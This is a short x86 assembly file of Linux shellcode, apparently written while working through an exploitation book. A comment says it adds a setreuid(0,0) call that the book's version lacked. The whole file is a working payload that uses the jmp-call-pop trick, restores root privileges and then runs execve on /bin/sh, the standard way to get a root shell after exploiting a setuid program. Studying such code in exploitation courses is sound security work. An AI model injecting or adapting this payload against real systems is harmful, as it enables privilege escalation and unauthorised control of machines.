BITS 32

jmp short two;

one:        ;This shellcode provided in book has no setreuid(0,0) befor execve.
    pop ebx;
    xor eax, eax;
    push ebx;
    xor ebx, ebx;
    xor ecx, ecx;
    mov al, 70;
    int 0x80;

    pop ebx;
    xor eax, eax;
    mov [ebx+7], al;
    mov [ebx+8], ebx;
    mov [ebx+12], eax;
    lea ecx, [ebx+8];
    lea edx, [ebx+12];
    mov al, 11;
    int 0x80;

two: 
    call one;
    db '/bin/shXAAAABBBB';